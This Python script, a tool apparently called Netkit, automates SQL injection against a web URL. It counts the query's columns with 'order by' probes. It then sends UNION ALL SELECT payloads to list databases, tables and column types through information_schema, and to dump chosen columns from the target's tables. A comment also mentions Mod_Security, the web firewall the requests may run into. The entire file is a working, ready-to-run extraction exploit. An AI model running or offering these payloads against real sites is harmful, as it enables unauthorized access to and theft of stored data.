#!/bin/python3
# -*- coding: utf-8 -*-
# -*- coded by: Fzin -*-

import requests
from time import time, sleep
from prettytable import PrettyTable
import argparse

class sqli():
    #função para realizar as querys

    def sqli(self, pull_type: str, diretory: str, extra: str="", column=False, C=False):
        infos = [' ']
        new = []
        if column: ta = [];co = []
        request = ''

        if not C:
            print("\033[01;32m[+]\033[0;0m\033[01;39mInitializing queries\033[0;0m")

            if not column:
                print(f"\033[01;32m[+]\033[0;0m\033[01;39mUsing: CONCAT(UPPER('x{self.num}tikten0x'), {pull_type}, UPPER('x0tikten{self.num}x'))\033[0;0m")

            else:
                print(f"\033[01;32m[+]\033[0;0m\033[01;39mUsing: CONCAT(UPPER('x{self.num}tikten0x'), {pull_type}, ' ', column_type, UPPER('x0tikten{self.num}x'))")

        while not infos == "\n<empty>" and not C or request.find("X12TIKTEN0XX0TIKTEN12X"):
            request = ''
            algr = []

            for j in range(self.num):
                if column: algr.append(f"CONCAT(UPPER('x{self.num}tikten0x'), {pull_type}, ' ', column_type, UPPER('x0tikten{self.num}x'))")
                else: algr.append(f"CONCAT(UPPER('x{self.num}tikten0x'), {pull_type}, UPPER('x0tikten{self.num}x'))")

            algr = ",".join(algr)

            for j in infos:
                if j.split() != [] and column: new.append(f"{pull_type} != '{j.split()[0]}'")
                else: new.append(f"{pull_type} != '{j}'")

            new = " AND ".join(new)
            request = requests.get(f"{self.args.u} union all select {algr} from {diretory} where {new} {extra} --")
            request = request.text

            try:
                co = request.index(f"X{self.num}TIKTEN0X")+len(f"X{self.num}TIKTEN0X")
                fi = request.index(f"X0TIKTEN{self.num}X")
            except:
                break

            request = request[co:fi]
            if column:
                request = request.replace("unsigned", "")
            infos.append(request)
            new = []
            if infos[0] == ' ': del infos[0]

        info = infos
        infos = "\n".join(set(infos))

        if infos.replace(" ", "") == "" and C:
            infos = "\n<empty>"

        elif infos.replace(" ", "") == "" and not C:
            infos = "\033[01;91m[+]\033[0;0m\033[01;39mNot Results\033[0;0m"

        if C: return info
        else: print();return infos



    def pulln_columns(self):
        print("\033[01;32m[+]\033[0;0m\033[01;39mStarting\033[0;0m")
        print("\033[01;32m[+]\033[0;0m\033[01;39mTesting Connection\033[0;0m")

        try:
            request = requests.get(self.args.u)

        except KeyboardInterrupt:
            exit()

        except requests.exceptions.ConnectionError:
            print("\033[01;91m[+]\033[0;0m\033[01;39mConnection not ok\033[0;0m")
            exit()

        except requests.exceptions.MissingSchema:
            print("\033[01;91m[+]\033[0;0m\033[01;39mInvalid url\033[0;0m")
            exit()

        except requests.exceptions.ChunkedEncodingError:
            print("\033[01;91m[+]\033[0;0m\033[01;39mConnection Reset by peer\033[0;0m")
            exit()

        print("\033[01;32m[+]\033[0;0m\033[01;39mConnection ok\033[0;0m")
        print("\033[01;32m[+]\033[0;0m\033[01;39mDiscovering number of columns\033[0;0m")
        request = ""
        self.num = 1
        self.fncexiste = False

        self.url = self.args.u.lower().replace("http://", "")
        self.url = self.url.replace("https://", "")
        self.url = self.url.replace("www.", "www").replace("/", "-")
        self.url = f".num-columns-{self.url}"

        open(self.url, "a").write(" ")
        file = open(self.url, "r")
        texto = file.read().replace(" ", "")

        if texto != "":
            self.fncexiste = True
            self.num = int(texto)

        while not "warning: mysql" in request.lower() and not "unknown column" in request.lower() and not self.fncexiste:

            try:
                request = requests.get(f"{self.args.u} order by {self.num} --").text
                # tirar mod_security
                #generated by Mod_Security
            except KeyboardInterrupt:
                exit()
            except:
                None
            sleep(0.01)
            self.num += 1
        if not self.fncexiste:
            self.num -= 2
        file = open(self.url, "w")
        file.write(str(self.num))
        file.close()
        print(f"\033[01;32m[+]\033[0;0m\033[01;39m{self.num} columns\033[0;0m")



    #função para pegar informações do argv
    def pull_columns(self, require, info):
        if not info in self.argv:
            print(f"Netkit: {require} requires {info}.")
            exit()

        try:
            typee = self.argv.index(info)+1
            typee = self.argv[typee]

        except:
            print("Netkit: missing arguments. Type -h to see the list of commands. ")
            exit()

        if typee == "*":
            print("\033[01;91m[+]\033[0;0m\033[01;39m It is not possible to use * \033[0;0m")
            exit()

        if "--dbs" in self.argv:
            print("Netkit: Args invalids")
            exit()

        return typee



    def divisora(self, res, ini):
        st = []
        res = res.split()

        for i in range(len(res)//2):
            st.append(res[ini])
            ini += 2
        return st



    def __init__(self):
        ini = time()
        #se for usar --columns ou um outro paramêtro que pode exigir mais de um argumento, vai poder separar de varias formas com ","
        from sys import argv
        self.argv = argv
        del argv, self.argv[0]
        self.argv = " ".join(self.argv)
        self.argv = self.argv.replace(" ,", ",").replace(", ", ",")
        self.argv = self.argv.split()
        self.parser = argparse.ArgumentParser(usage="python3 netkit.py --sqli", description="Netkit is a Swiss army knife tool.")

        self.parser.add_argument("--sqli", action="store_true")
        self.parser.add_argument("-u", help="To set url.", metavar="<URL>", required=True)
        self.parser.add_argument("-D", help="To set database.", metavar="<DB>")
        self.parser.add_argument("-T", help="To set table.", metavar="<TABLE>")
        self.parser.add_argument("-C", help="To set column.", metavar="<COLUMN>", nargs="*")
        self.parser.add_argument("--dbs", help="To try to grab the table from the database.", action="store_true")
        self.parser.add_argument("--tables", help="To try to grab the table from the database.", action="store_true")
        self.parser.add_argument("--columns", help="To try to grab the table column in the database.", action="store_true")

        self.args = self.parser.parse_args()

        if not self.args.u:
            print("Netkit: missing arguments. Type -h to see the list of commands.")
            exit()

        if self.args.tables:

            if self.args.columns:
                print("Netkit: Args invalids")
                exit()

            db = self.pull_columns("--tables", "-D")

            if db == "--tables":
                print("Netkit: -D requires name of database.")
                exit()

            self.pulln_columns()
            res = self.sqli("table_name", "information_schema.tables", f"and table_schema = '{db}'")

            if not res == "\033[01;91m[+]\033[0;0m\033[01;39mNot Results\033[0;0m":

                print(f"\033[01;32m[+]\033[0;0m\033[01;39m{len(res.split())} tables found\n\033[0;0m")

                t = PrettyTable()
                t.add_column(db, res.split())
                print(t)

            else: print(res)


        elif self.args.columns:

            if self.args.tables:
                print("Netkit: Args invalids")
                exit()

            db = self.pull_columns("--columns", "-D")
            table = self.pull_columns("--columns", "-T")
            self.pulln_columns()
            res = self.sqli("column_name", "information_schema.columns", f"and table_schema = '{db}' and table_name = '{table}'", column=True)

            if not res == "\033[01;91m[+]\033[0;0m\033[01;39mNot Results\033[0;0m":

                print(f"\033[01;32m[+]\033[0;0m\033[01;39m{len(res.split())//2} columns found\n\033[0;0m")

                t = PrettyTable()
                t.add_column(table, self.divisora(res, 0))
                t.add_column("Type", self.divisora(res, 1))
                print(t)

            else: print(res)

        elif self.args.C:
            if "--tables" and "--columns" in self.argv:
                print("Netkit: Args invalids")
                exit()

            db = self.pull_columns("-C", "-D")
            table = self.pull_columns("-C", "-T")
            columns = self.pull_columns("-C", "-C")
            self.pulln_columns()
            t = PrettyTable()
            err = False

            for i in columns.split(","):
                res = self.sqli(i, f"{db}.{table}", C=True)
                try: t.add_column(i, res)
                except: err = True; break

            if err:
                for i in columns.split(","):
                    res = self.sqli(i, f"{db}.{table}", C=True)
                    t = PrettyTable()
                    t.add_column(i, res)
                    print(t)

            else: print(t)

        elif self.args.dbs:
            self.pulln_columns()
            res = self.sqli("table_schema", "information_schema.tables")

            if not res == "\033[01;91m[+]\033[0;0m\033[01;39mNot Results\033[0;0m":

                print(f"\033[01;32m[+]\033[0;0m\033[01;39m{len(res.split())} Databases found\n\033[0;0m")
                t = PrettyTable()
                t.add_column("Database", res.split())
                print(t)
            else: print(res)

        ini = time() - ini
        print(f"\nTime: {ini}")
